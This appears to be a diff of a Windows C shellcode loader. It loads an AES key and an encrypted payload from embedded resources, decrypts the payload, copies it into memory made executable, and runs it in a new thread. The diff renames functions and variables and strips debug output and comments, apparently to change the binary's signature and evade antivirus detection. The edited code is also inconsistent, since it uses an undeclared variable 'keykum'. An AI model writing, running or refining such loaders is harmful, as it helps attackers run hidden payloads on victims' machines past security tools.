@@ -5,7 +5,7 @@
 #pragma comment (lib, "user32.lib")
 
 // Function to load resource data into memory
-void ResourceLoadBaby(const char* resName, unsigned char** data, DWORD* size) {
+void coolresload(const char* resName, unsigned char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
     if (!hResource) {
@@ -19,7 +19,7 @@ void ResourceLoadBaby(const char* resName, unsigned char** data, DWORD* size) {
 }
 
 // Function to decrypt AES encrypted shellcode
-void ADECSC(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
+void DECaes(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
     HCRYPTPROV hProv;
     HCRYPTHASH hHash;
     HCRYPTKEY hKey;
@@ -38,11 +38,7 @@ void ADECSC(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
 
 
 // Function to print hex representation of the byte array
-//void PrintHex(unsigned char* data, DWORD size) {
-    //for (DWORD i = 0; i < size; i++) {
-        //printf("0x%02X ", data[i]);
-    //}
-    //printf("\n");
+
 //}
 
 int main() {
@@ -50,35 +46,32 @@ int main() {
 
     unsigned char* AESkey;
     DWORD AESkeyLen;
-    ResourceLoadBaby("AESKEY", &AESkey, &AESkeyLen);  // Load AES key
+    coolresload("AESKEY", &AESkey, &AESkeyLen);  // Load AES key
 
     unsigned char* AESCode;
     DWORD AESCodeLen;
-    ResourceLoadBaby("AESCODE", &AESCode, &AESCodeLen);  // Load AES shellcode
+    coolresload("AESCODE", &AESCode, &AESCodeLen);  // Load AES shellcode
 
     // Print the AES key and shellcode for debugging (as hex)
      unsigned char keyy[AESkeyLen];
     unsigned char codee[AESCodeLen];
 
     // Copy the data into the arrays
-    memcpy(keyy, AESkey, AESkeyLen);
+    memcpy(keykum, AESkey, AESkeyLen);
     memcpy(codee, AESCode, AESCodeLen);
 
     // Print the AES key and shellcode for debugging (as hex)
-    //printf("AES Key: ");
-    //PrintHex(keyy, AESkeyLen);
-    //printf("AES Code: ");
-    //PrintHex(codee, AESCodeLen);
+    
 
-    LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
+    LPVOID coollo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
 
-    ADECSC((char*)codee, sizeof(codee), keyy, sizeof(keyy));  // Decrypt AES shellcode
+    DECaes((char*)codee, sizeof(codee), keykum, sizeof(keykum));  // Decrypt AES shellcode
 
-    memcpy(memalo, codee, sizeof(codee));  // Copy decrypted shellcode to allocated memory
+    memcpy(coollo, codee, sizeof(codee));  
     DWORD oldProtect;
-    VirtualProtect(memalo, sizeof(codee), PAGE_EXECUTE_READ, &oldProtect);  // Change protection to execute
+    VirtualProtect(coollo, sizeof(codee), PAGE_EXECUTE_READ, &oldProtect);  
 
-    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memalo, NULL, 0, NULL);  // Execute shellcode in a new thread
+    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)coollo, NULL, 0, NULL);  
     WaitForSingleObject(tHandle, INFINITE);  // Wait for thread to finish
 
     return 0;
